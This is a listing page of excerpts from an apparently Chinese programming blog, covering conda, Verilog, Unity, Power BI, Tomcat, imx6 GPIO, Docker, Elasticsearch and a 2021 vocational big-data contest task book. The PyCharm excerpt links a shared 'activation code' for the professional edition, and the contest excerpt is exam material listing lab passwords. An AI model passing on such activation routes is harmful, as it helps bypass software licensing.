##为满足软件所需的python版本要求，所以规定了python版本为2.7，可根据需求改动 ##另，-c参数指从conda-forge源安装rdkit，-n参数规定了新创建环境的名称为my-rdkit-env（可自定义） conda create -c conda-forge -n my-rdkit-env rdkit python=2.7 ##等待安装完成后，激活这一环境即可使用rdkit conda activate my-rdkit-env （看来有问题还是得先看官方
至此完成anaconda环境的配置和rdkit的安装
就这些，结束！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/410041caba9b87c1b52c7ad8411979d8/" rel="bookmark">
			Verilog二维数组一维数组相互转换
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 转自：https://blog.csdn.net/qq_35861248/article/details/112990098
Verilog二维数组端口使用方法
Verilog不支持二维数组端口定义，限制了模块可扩展性。
通过generate将二维数组打包为一维数组输出，或将一维数组展开为二维数组即可方便地进行管理
将下列宏函数写入头文件并包含在设计中，直接调用宏函数进行打包\展开即可。
//二维数组打包为一维数组 `define PACK_ARRAY(PK_WIDTH,PK_LEN,PK_SRC,PK_DEST) \ generate \ genvar pk_idx; \ for (pk_idx=0; pk_idx&lt;(PK_LEN); pk_idx=pk_idx+1) \ begin \ assign PK_DEST[((PK_WIDTH)*pk_idx+((PK_WIDTH)-1)):((PK_WIDTH)*pk_idx)] = PK_SRC[pk_idx][((PK_WIDTH)-1):0]; \ end \ endgenerate //一维数组展开为二维数组 `define UNPACK_ARRAY(PK_WIDTH,PK_LEN,PK_DEST,PK_SRC) \ generate \ genvar unpk_idx; \ for (unpk_idx=0; unpk_idx&lt;(PK_LEN); unpk_idx=unpk_idx+1) \ begin \ assign PK_DEST[unpk_idx][((PK_WIDTH)-1):0] = PK_SRC[((PK_WIDTH)*unpk_idx+(PK_WIDTH-1)):((PK_WIDTH)*unpk_idx)]; \ end \ endgenerate 用例
module example ( input [63:0] pack_4_16_in, output [31:0] pack_16_2_out ); wire [3:0] din [0:15]; `UNPACK_ARRAY(4,16,din,pack_4_16_in) wire [15:0] out [0:1]; `PACK_ARRAY(16,2,din,pack_16_2_out) endmodule 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/633fda0b6bf4c22a1d4120926e525018/" rel="bookmark">
			Unity鼠标控制3D物体的移动、旋转、缩放
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、鼠标控制3D物体移动 1.使用协程 using System.Collections; using System.Collections.Generic; using UnityEngine; public class ControlMove : MonoBehaviour { Vector3 cubeScreenPos; Vector3 offset; void Start() { StartCoroutine(OnMouseDown());//在Start方法中调用StartCoroutine(要调用的协程方法) } //协程 IEnumerator OnMouseDown() { //1. 得到物体的屏幕坐标 cubeScreenPos = Camera.main.WorldToScreenPoint(transform.position); //2. 计算偏移量 //鼠标的三维坐标 Vector3 mousePos = new Vector3(Input.mousePosition.x, Input.mousePosition.y, cubeScreenPos.z); //鼠标三维坐标转为世界坐标 mousePos = Camera.main.ScreenToWorldPoint(mousePos); offset = transform.position - mousePos; //3. 物体随着鼠标移动 while (Input.GetMouseButton(0)) { //目前的鼠标二维坐标转为三维坐标 Vector3 curMousePos = new Vector3(Input.mousePosition.x, Input.mousePosition.y, cubeScreenPos.z); //目前的鼠标三维坐标转为世界坐标 curMousePos = Camera.main.ScreenToWorldPoint(curMousePos); //物体世界位置 transform.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/633fda0b6bf4c22a1d4120926e525018/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/95c82ac70c4908ccbc40819d97e86e98/" rel="bookmark">
			可以说是迄今为止最好用的右键菜单管理工具
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		卸载了几个软件，但是发现右键菜单多了{:}这样的选项，烦死了。拿出我的电脑管家，然鹅，全删了也没搞掉。下载方式见文章末尾。
多方搜寻，找到这个神仙软件，管理功能非常人性化，可以很轻松找到自己想要删除的右键菜单。
1.外部下载地址：zapps - Browse /RightMenuMgr at SourceForge.net
2.csdn下载地址：https://download.csdn.net/download/weixin_41548572/81444269
多谢支持哦
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9b3b94959f2ecefb217669fc959e7647/" rel="bookmark">
			Power BI——如何关联维度表和事实表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、基本概念： 1.维度表：
主要是作为参考表，比如日期表（日期，财年，周数，月数），人员信息表（人名，工号，身份证，入职时间，岗位，籍贯），产品信息表（产品ID, 产品名字，产品所属产品线，产品的量产时间等），客户信息表（客户ID, 客户名字，客户类型，客户所在省份，客户类别等）。这些标的一个特点是，有一些属性是位移的，比如身份证，客户ID, 产品ID，维度表的唯一性对于后面做关系映射至关重要。
2.事实表：
事实数据。例如产品销售数据，公司财务数据这些都是事实表。
二、操作步骤： 1.导入数据表，打开此维度表找到 GeographyID字段：
2.打开此事实表找到 GeographyID字段：
3.说明维度表和事实表这两个表的关联条件是两个表都有一个GeographyID字段，表示地理ID。
单击左侧“模型”选项卡，找到上述两个表用GeographyID进行关联：
*注意：
黄色线：表示两个表的关联的连接线；线的两头有两个符号，分别是1和*，表示的是1对多的关系；数据表的黑色方框表示两个表关联的字段； 三、报表效果： 通过两个表设置关联关系后，我们就可以引用另一个表中的字段。在Power BI Desktop 中，如果两个表有相同的字段名称，Power BI Desktop 会“智能”的设置关联，如果没有设置，用户可以通过将一个表中的字段拖拽放到另一个表相应的字段上，就可以设置两个表的关联关系；另外，如果设置关系错误，用户也可以通过删除连接线，取消关联关系后再做设置。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/361800283b556b7a5e39775a378a6870/" rel="bookmark">
			任务型对话建模
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		SLU：把自然语言转换成机器可以处理的领域(domain)/意图(intention) 和槽植对(slot-value pairs)，他的输入是代表用户输入Utterance的Xn，输出是Un。
Xn就是用户说的话，一般是几个到几十个词。
Un=（In, Zn), In是intention，Zn是槽植对。
In=f(Xn) , 就是意图分类，一般分类方法都行，也可采用DBN、DCN等方法。
Zn=f(Xn)，Zn = { 1, 2, 3…}，是序列标准问题，传统的CRF、HMM都行，RNN、LSTM、GRU等也可以。
另外为了解决领域数据不足的问题，SLU还有很多迁移学习(Transfer Learning)方面的工作。比如实例迁移、模型适配、参数迁移、领域关系迁移等。
DST：作用是根据领域(domain)/意图(intention) 、曹植对(slot-value pairs)、之前的状态以及之前系统的Action等来追踪当前状态。它的输入是Un、An-1和Sn-1，输出是Sn。
S = {Gn,Un,Hn}，Gn是用户目标、Un同上、Hn是聊天的历史，Hn= {U0, A0, U1, A1, ... , U −1, A −1}，S =f(S −1,A −1,U )。
DST涉及到两方面内容：状态表示、状态追踪。具体方法和论文后续我会一一放出(其实早就整理好了，还在想用什么形式来出更容易理解，有好的建议的欢迎提出来)。
另外为了解决领域数据不足的问题，DST还有很多迁移学习(Transfer Learning)方面的工作。比如基于特征的迁移学习、基于模型的迁移学习等。
DPL( 也叫DPO)基于当前状态(state)决定系统需要采取action。它的输入是Sn，输出是An。
S = {Gn,Un,Hn}，An是系统的Action，A ={Dn, {Ai, Vi}}，Dn是对话类型，Ai、Vi是第i轮对话的attribute和其value。DST一般会建模成强化学习或深度强化学习(从不同维度区分的话有非常多的变种，后面一一介绍)。
另外为了解决领域数据不足的问题，DPL还有很多迁移学习(Transfer Learning)方面的工作。比如线性模型迁移学习、高斯过程迁移学习、BCM迁移学习等。
NLG：把系统的Action转换成用Yn表示的自然语言形式的系统response。它的输入是An，输出是Yn。NLG方法非常多，比如基于规则的、基于模板的、基于短语的、基于token的、基于句法树的( 变种也不少，不过大同小异，大多是trick层面的)、基于corpus的、基于神经网络的(变种很多，如RNN、RNN+CNN、RNN+LM、LSTM+SC等)、基于神经网络+句法树的等等，后续会一一介绍。
其中A ={Dn, {Ai, Vi}}，Yn = {y1,y2,y3…}，yi是第i轮的系统回复(response)。
另外为了解决领域数据不足的问题，NLG还有很多迁移学习(Transfer Learning)方面的工作。比如线在 原始领域预训练然后在目标领域(Target domain)做fine-tuning、基于实例的迁移学习、基于参数的迁移学习等。
为了在抽象的建模的基础上加深理解，看个小例子：
1：I would like a cup of coffee.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/361800283b556b7a5e39775a378a6870/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4ed5c2aa370745a0bb8bd6ba18ab8746/" rel="bookmark">
			SprintBoot面经
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/12f87d2d529ca6a04e70c77118bed24f/" rel="bookmark">
			如何将jar包或war包部署到tomcat服务上
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		关于打好包的项目如何部署到服务器上，一直也没有用到，用到的时候总还记不起来，所以在这里先小记一下，以防忘记。
首先我们常见的打包方式有两种，一种是jar包，一种是war包。
这两种打包方式的区别：如下链接所讲https://www.cnblogs.com/banml/p/11767305.html；（基础概念略过）
一般的spring项目我们打包时将其打为war包，在pom文件中进行设置&lt;package&gt;war&lt;/package&gt;，一般默认也为war包；
springboot项目打包后其中内置有tomcat，所以我们只需要将其打为jar包；
1.war包的部署方式：
当我们已经打好一个项目为war包时，我们只需要将打好的.war文件复制粘贴到安装好的tomcat文件目录下的webapps下即可，tomcat监视其文件夹下的变化，检测到有新文件时，他会尝试将其进行部署。
文件copy完成后，我们进入bin文件夹，双击startup.bat即可启动tomcat将其运行起来。
如果要更改tomcat的端口
我们可以在conf文件夹下修改server.xml中的 port端口号即可。
&lt;Connector port="8080" protocol="HTTP/1.1" connectionTimeout="20000" redirectPort="8443" /&gt;
解决tomcat中文乱码问题：
conf文件中logging.properties文件加入
java.util.logging.ConsoleHandler.encoding = GBK 即可； 2.关于jar包：
我们在springboot项目中一般将其打为jar包，因为其内置有tomcat，所以我们只需在java环境下运行即可完成部署，也是比较方便快捷的；
cmd进入我们命令行界面，输入java-jar +（打好的jar文件名即可） 例如：java -jar springboot.jar 回车即可；
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e1dca3c80dbcd693e58a1218eb7f7e61/" rel="bookmark">
			uniapp 小程序 在js中进行rpx与px混合计算
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 比如要计算 10px + 20rpx 是多少px
js中代码
10 + (windowWidth/750)*20 + 'px' 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b8f389019d2df412aa3ac43fa0b83a53/" rel="bookmark">
			史上最全最细imx6 GPIO配置流程及讲解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我们拿到板子要做的第一件事，往往是驱动一个gpio，控制其 GPIO 输出高低电平，在有些应用场景中，需要做到开机之后，某个引脚一直输出一个电平来初始化设备，这就不仅需要在内核中配置引脚为GPIO功能，还需要在uboot阶段也配置为GPIO功能。本篇文章就详细的介绍如何配置一个GPIO.以GPIO3_IO00为例：
uboot下修改GPIO： 1.首先需要配置IO口的寄存器
打开arch/arm/include/asm/arch-mx6/mx6q_pins.h文件，搜索EIM_DA0
可以看到mx6q_pins.h文件里已经添加了所有io口的功能定义，我们不需要修改它。
可以点进去查看一下定义
先看1，MX6_PAD_DECL=MX6_PAD_DECLARE，且和第一张图里的参数对应，
再看3，MX6_PAD_DECLARE=prefix##name = IOMUX_PAD(pco, mc, mm, sio, si, pc)
替换之后为
MX6_PAD_##name =IOMUX_PAD(pco, mc, mm, sio, si, pc)
最后替换prefix，传递参数之后
MX6_PAD_EIM_DA0__GPIO3_IO00=IOMUX_PAD(0x0428, 0x0114, 5, 0X0000, 0, 0)
prefix应该是识别标志
之后看参数都去了哪，点开IOMUX_PAD函数定义，
定义对应变量为iomux_v3_cfg_t类型，u64，long long就是64位，即定义了个无符号64位数据类型。
将值传递进去且左移一些位，然后去网上查一下资料，找到对应宏的含义。上图第一个框和第二个框参数有位置颠倒。
上图的值分别左移12 ，0，36，24，60，42 ，
寄存器的值已经变换且放到了一个无符号64位变量的不同位置。
这个函数里面寄存器值分别对应
第四个寄存器没有，后面值都为0
寄存器配置就到这里
2.修改board/freescale/mx6sabresd/mx6sabresd.c文件，我们需要添加引脚配置为GPIO功能：
static iomux_v3_cfg_t const gpio_pads[] = {
MX6_PAD_EIM_DA0__GPIO3_IO00 | MUX_PAD_CTRL(NO_PAD_CTRL),
};
MX6_PAD_EIM_DA0__GPIO3_IO00=IOMUX_PAD(0x0428, 0x0114, 5, 0X0000, 0, 0)
点开MUX_PAD_CTRL，定义64位无符号变量 x 左移42位
其实就是之前设置的寄存器，将其做了一个宏。
MUX_PAD_CTRL(NO_PAD_CTRL)=1左移59位
之后再看MX6_PAD_EIM_DA0__GPIO3_IO00 | MUX_PAD_CTRL(NO_PAD_CTRL)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b8f389019d2df412aa3ac43fa0b83a53/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5fa11077d223e367072572d37f38dbbb/" rel="bookmark">
			【总结】1240- Ant-Design 动态换肤方案总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		开头 最近有需求要换肤，于是研究了下这个方向，故事就这么开始了
换肤的技术调研 1.Less在线编译 - 前端引入Less
2.多套Css皮肤实现
3.覆盖样式实现
4.Css变量实现
5....若干方案
一个换肤，就有很多种方案，那么就要好好考虑了
项目实际情况 由于我们的项目是基于React + Ant-Design开发的，那么我最想用的是Ant-Design的官方方案，于是随着时间流逝，我发现Ant-Design更新了4.17.1-alpha.0版本
并且在底部发现了一个切换主题色的功能
于是就好奇的点了进去
发现跟我之前设计的，通过react-color这个库来选择设置颜色，以及CSS变量实现的方案一样：
并且对于项目来说更友好，只需要：
引入 antd.variable.min.css#
替换当前项目引入样式文件为 CSS Variable 版本：
-- import 'antd/dist/antd.min.css'; ++ import 'antd/dist/antd.variable.min.css'; 注：如果你使用了 babel-plugin-import，需要将其去除。
静态方法配置
调用 ConfigProvider 配置方法设置主题色：
import { ConfigProvider } from 'antd'; ConfigProvider.config({ theme: { primaryColor: '#25b864', }, }); 这里面的坑 如果你使用了webpack打包进行代码分割，就会存在异步的chunk模块，那么很可能这个换肤就会失效，这个时候你就要把antd/dist/antd.variable这个文件放在静态资源服务器上，在项目中进行异步加载。
例如，在项目中获取到基础数据后,再创建一个style标签加载这个antd/dist/antd.variable文件,最后用标签形式插入到document中：
getBaseInfo().then(getVariableCssAndAppend)； 然后就再调用ConfigProvider.config，换肤就生效了：
官方方案最舒服的是不用自己去梳理哪些变量等，他们会给出5个选项可以选择，并且可以动态换肤，缺点是不支持IE，以及需要升级到antd@4.17.0-alpha.0版本
结尾 要用好一个开源库，前提是要知道某些方面的实现原理，例如这次我们踩的坑，就是异步引入模块导致设置主题失效，所以大家觉得学源码原理有没有用呢？当然是有用的，所以，加油学习吧~
1. JavaScript 重温系列（22篇全）
2. ECMAScript 重温系列（10篇全）
3. JavaScript设计模式 重温系列（9篇全）
4. 正则 / 框架 / 算法等 重温系列（16篇全）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5fa11077d223e367072572d37f38dbbb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/026e508c7f9bd7acf5c9034683352b3d/" rel="bookmark">
			解决 Vue 使用 $ref 调用子组件方法时的控制台报错
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 解决 Vue 使用 $ref 调用子组件方法时的控制台报错 报错原因解决办法 报错原因 代码和控制台报错, Uncaught TypeError: Cannot read properties of undefined
this.$refs.chatting.getMessageLib() 上述报错大多出现在操作弹窗子组件的页面元素的情景中，原因是子组件还未渲染到父组件的 DOM 中，就开始对子组件的元素进行操作了
解决办法 解决办法是把 ref 方法放到 vue 的内置函数中，$nextTick 可以等待 DOM 渲染完成后在调用里面的方法，这样控制台就不会出现报错了。
this.$nextTick(() =&gt; { this.$refs.chatting.getMessageLib() }) 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7f7c436aa1af751f451268855bf30b6c/" rel="bookmark">
			0029【ELKF-Linux版】总有一款你喜欢的分布式日志系统，就是它了
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		零 前期工作 0.1 环境 端口
elasticsearch:9200、9300 kibana:5601 logstash:5044 filebeat: 依赖jdk
elasticsearch: jdk11或以上 logstash: jdk11或以上 功能
ELKF 是 Elasticsearch 、 Logstash 、 Kibana 、 Filebeat 的简称。 elasticsearch: 存储、搜索和分析引擎，特点是高可伸缩、高可靠和易管理等。 kibana: 数据分析和可视化平台，通常依赖 elasticsearch 。 logstash: 数据收集引擎，可以对数据进行过滤、分析、丰富、统一格式等操作，存储到用户指定的位置，包含但不限于文件、 elasticsearch 。 filebeat: 轻量级的开源日志文件数据搜集器，负责对服务的日志进行收集。 简单归纳为：FileBeat收集日志、Logstash解析格式化、Elasticsearch存储、Kibana分析。 0.2 文件上传 将相关文件相继上传到目录/home/elkf 下
0.3 文件解压 cd /home/elkf tar -xzvf elasticsearch-7.17.0-linux-x86_64.tar.gz tar -xzvf kibana-7.17.0-linux-x86_64.tar.gz tar -xzvf logstash-7.17.0-linux-x86_64.tar.gz tar -xzvf filebeat-7.17.0-linux-x86_64.tar.gz 一 elasticsearch 1.1 配置elasticsearch.yml # ======================== Elasticsearch Configuration ========================= # # NOTE: Elasticsearch comes with reasonable defaults for most settings.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7f7c436aa1af751f451268855bf30b6c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/001aa0c2ea473f1fc88790b2616015e0/" rel="bookmark">
			pycharm安装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		有两个版本： professional专业版 Community 社区版
ubuntu安装pycharm专业版 1.下载安装
在官网下载安装包Download PyCharm: Python IDE for Professional Developers by JetBrains
解压安装包
tar -zxvf pycharm-professional-2020.1.tar.gz
新建目录 安放解压文件
sudo mkdir /opt/pycharm sudo mv pycharm-2020.1/ /opt/pycharm/ cd /opt/pycharm/ ls /opt ：给主机额外安装软件所摆放的目录
显示
则安装完毕
2.启动和配置 Pycharm
1）.启动Pycharm
sh /opt/pycharm/pycharm-2020.1/bin/pycharm.sh
2).稍后会弹出一个窗口，选择同意，然后Continue
3)、激活pycharm
选择中间的Activation code
将激活码粘进去，确定就好了 链接：https://pan.baidu.com/s/16kgyipATPndapfyCtCuOfg 提取码：0000 --来自百度网盘超级会员V1的分享 4).选择可用命令行启动Pycharm
也就是以后可以在终端中直接输入pycharm，回车后就启动 Pycharm
5).可选择安装一些插件
这个看个人需要，我就没有选择；如果以后需要，也可以在IDE中安装的
6).我们先不用着急进入，可以在这里设置桌面图标，这方便我们打开Pycharm，比命令行好使
——若错过 则
在桌面上创建pycharm快捷方式
sudo gedit /usr/share/applications/pycharm.desktop
复制粘贴下面文字 若路径不同自主更改
[Desktop Entry] Version=1.0 Type=Application Name=Pycharm Icon=/opt/pycharm/pycharm-2021.2.3/bin/pycharm.png Exec=sh /opt/pycharm/pycharm-2021.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/001aa0c2ea473f1fc88790b2616015e0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fcb53bdc4d3efbb020a8d7d0f135435f/" rel="bookmark">
			Authorization为啥必须要以Bearer开头
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		相信不少小伙伴对JWT中请求头信息中的Authorization必须要以Bearer开头有一些疑问，就参考了一下文档，在此作一下记录
Bearer代表Authorization头定义的schema ，除了Bearer，还有其它的一些 schemas , 标准规范请查看文档地址： 规范地址
作者：KingWorld
链接：https://www.jianshu.com/p/de90363fb45c
来源：简书
著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b3844f58fe0de12df4ced558d894ab83/" rel="bookmark">
			docker中没有nvidia驱动，且 nvidia-smi无输出，不报错的解决： --gpus all
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题 我的docker容器好好的，里面有nvidia驱动。导出成镜像后，再新建容器，却发现运行代码报错说我没有nvidia驱动。直接运行nvidia-smi命令，既不会报错，也没有输出。
解决 在docker run 的时候，加上 --gpus all:
docker run --privileged --gpus all -p XXX:6006 -p YYY:22 -it -d -v 宿主共享文件夹路径:docker共享文件夹路径 -w 工作路径 --name 容器名称 镜像名称 /bin/bash 疑点 问题我以前run的时候都没加 --gpus all，都好好的，不知道为啥现在不加不行。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/10704116b21b1fd732071f4e15cce154/" rel="bookmark">
			OpenLayers - 图层透视效果 （九）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		简介 本文主要讲解的是，通过控制图层，层级和大小来实现图层透视功能。
主要使用图层监听事件 prerender监听图层渲染之前，postrender监听图层渲染之后。
实现DEMO 初始化地图 &lt;!DOCTYPE html&gt; &lt;html lang="en"&gt; &lt;head&gt; &lt;meta charset="UTF-8" /&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge" /&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0" /&gt; &lt;title&gt;Document&lt;/title&gt; &lt;/head&gt; &lt;style type="text/css"&gt; .map { height: 500px; width: 100%; } &lt;/style&gt; &lt;link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/openlayers/openlayers.github.io@master/en/v6.6.1/css/ol.css" /&gt; &lt;script src="https://cdn.jsdelivr.net/gh/openlayers/openlayers.github.io@master/en/v6.6.1/build/ol.js"&gt;&lt;/script&gt; &lt;body&gt; &lt;div id="map" class="map"&gt;&lt;/div&gt; &lt;/body&gt; &lt;script&gt; // 图层 var roads = new ol.layer.Tile({ source: new ol.source.XYZ({ url: 'https://webrd01.is.autonavi.com/appmaptile?lang=zh_cn&amp;size=1&amp;scale=1&amp;style=8&amp;x={x}&amp;y={y}&amp;z={z}' }) }) // 图层2 var imagery = new ol.layer.Tile({ source: new ol.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/10704116b21b1fd732071f4e15cce154/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fb97eaaa818ba1dcc89927970ebb0265/" rel="bookmark">
			Android 之窗口小部件详解--App Widget
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 App Widget简介
App Widget是应用程序窗口小部件（Widget）是微型的应用程序视图，它可以被嵌入到其它应用程序中（比如桌面）并接收周期性的更新。你可以通过一个App Widget Provider来发布一个Widget。
本文参考Android官方文本，先介绍App Widget的主要组件，然后再以示例来详细说明。
2 App Widget主要的相关类介绍 2.1 AppWidgetProvider AppWidgetProvider 继承自 BroadcastReceiver，它能接收 widget 相关的广播，例如 widget 的更新、删除、开启和禁用等。 AppWidgetProvider中的广播处理函数如下：
onUpdate()
当 widget 更新时被执行。
同样，当用户首次添加 widget 时，onUpdate() 也会被调用，这样 widget 就能进行必要的设置工作(如果需要的话) 。但是，如果定义了 widget 的 configure属性(即android:config，后面会介绍)，那么当用户首次添加 widget 时，onUpdate()不会被调用；之后更新 widget 时，onUpdate才会被调用。
onAppWidgetOptionsChanged()
当 widget 被初次添加 或者 当 widget 的大小被改变时，执行onAppWidgetOptionsChanged()。你可以在该函数中，根据 widget 的大小来显示/隐藏某些内容。可以通过 getAppWidgetOptions() 来返回 Bundle 对象以读取 widget 的大小信息，Bundle中包括以下信息：
OPTION_APPWIDGET_MIN_WIDTH -- 包含 widget 当前宽度的下限，以dp为单位。
OPTION_APPWIDGET_MIN_HEIGHT -- 包含 widget 当前高度的下限，以dp为单位。
OPTION_APPWIDGET_MAX_WIDTH -- 包含 widget 当前宽度的上限，以dp为单位。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fb97eaaa818ba1dcc89927970ebb0265/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3975132b9406a1208bf0b5c4f4e10ef0/" rel="bookmark">
			sqli-labs出现“Fatal error：Uncaught Error”的解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		错误重现： 解决方法： （网站PHP版本问题）
第一步：
下载 安装 php5.4
第二步：
点击网站------管理------PHP版本------点击php5.4版本
第三步：
打开sqli-labs-master
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1a28080c884ed36dee73f80c6ea97394/" rel="bookmark">
			elasticsearch Histogram field type 使用及注意事项
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		elasticsearch Histogram field type 使用及注意事项 HistogramHistogram field typeQuick startError exampleAggregationmin aggregationmaxsumvalue_countavghistogram aggregation Queryexists query END Histogram 先附上文档链接: https://www.elastic.co/guide/en/elasticsearch/reference/7.17/histogram.html
当在网络上搜索 elasticsearch Histogram 时，会有两个结果：
type Histogramaggregation Histogram 但是 对于 aggregation 的结果会比较多，而 type 的却很少，那么，本篇博文主要记录 type Histogram 的使用以及注意事项。ps（本篇博文还有一些未理解的点待调研，因此，本篇博文会不断更新）
Histogram field type Histogram 是由两个成对数组定义的类型。
它有以下注意事项：
values 存储类型为 double 而且必须升序counts 必须是 integet 必须是正整数或者0这两个数组的长度是一致的，这是因为他们的值一 一 对应并且不支持 嵌套数组，以及排序。 Histogram 存储的数据为二进制文档，而不是索引，这样可以更快速的聚合，它的字节大小最多为 13*数组的长度。
Quick start 添加 mapping
PUT histogram_test { "mappings" : { "properties" : { "my_histogram" : { "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1a28080c884ed36dee73f80c6ea97394/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b314edba908f77f9a38117b67e507875/" rel="bookmark">
			2021年全国职业院校技能大赛大数据应用技术国赛题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2021年全国职业院校技能大赛
高职组
“大数据技术与应用”
赛项赛卷（GZ-xxxxxxx-X卷）
任
务
书
参赛队编号： 背景描述
据央视财经报道，2020年我国O2O市场规模突破万亿元，O2O市场存在着巨大的潜力。特别是餐饮和外卖行业，占据市场较大份额，并且业务增长迅速。截至2020年底，全国外卖总体订单量已超过171.2亿单，同比增长7.5%，全国外卖市场交易规模达到8352亿元，同比增长14.8%。我国外卖用户规模已接近5亿人，其中80后、90后是餐饮外卖服务的中坚消费力量，消费者使用餐饮外卖服务也不再局限于传统的一日三餐，下午茶和夜宵逐渐成为消费者的外卖新宠。为把握这一商业机遇，ChinaSkills公司计划进驻外卖平台市场，现需对大规模成熟外卖平台进行详细评估调研，采集多方多维度数据，寻找行业痛点，摸清市场需求，以技术为手段为投资保驾护航。
为完成该项工作，你所在的小组将应用大数据技术，以Python、Java、Scala作为整个项目的基础开发语言，基于大数据平台综合利用MapReduce、Spark、MySQL、Scrapy、Flask、ECharts等，对数据进行获取、处理、清洗、挖掘、分析、可视化呈现，力求实现对公司未来的重点战略方向提出建议。 你们作为该小组的技术人员，请按照下面任务完成本次工作，并编制综合报告。
模块A：Hadoop平台及组件的部署管理（15分）
环境说明：
编号
主机名
类型
用户
密码
1
master
主节点
root
passwd
2
slave1
从节点
root
passwd
3
slave2
从节点
root
passwd
补充说明：主节点MySQL数据库用户名/密码：root/Password123$
相关软件安装包在/chinaskills目录下
所有模块中应用命令必须采用绝对路径
任务一：Hadoop HA部署管理
本环节需要使用root用户完成相关配置，安装Hadoop需要配置前置环境，具体部署要求如下：
将/chinaskills下的JDK包解压到/usr/local/src路径下，命令复制并粘贴至对应报告中；设置JDK环境变量，并使环境变量只对当前root用户生效；将环境变量配置内容复制并粘贴至对应报告中；从master复制JDK环境变量文件到slave1、slave2节点，命令和结果复制并粘贴至对应报告中；配置SSH密钥登录，实现从master登录到slave1，命令和结果复制并粘贴至对应报告中；Zookeeper配置完毕后，在slave2节点启动Zookeeper，查看Zookeeper运行状态，将命令和结果复制并粘贴至对应报告中；Zookeeper、Hadoop HA配置完毕后，在master节点启动Hadoop，并查看服务进程状态，并将结果复制并粘贴至对应报告中；Hadoop HA配置完毕后，在slave1节点查看服务进程，将命令及结果复制并粘贴至对应报告中。 任务二：Hive部署管理
本环节需要使用root用户完成相关配置，已安装Hadoop及需要配置前置环境，具体部署要求如下：
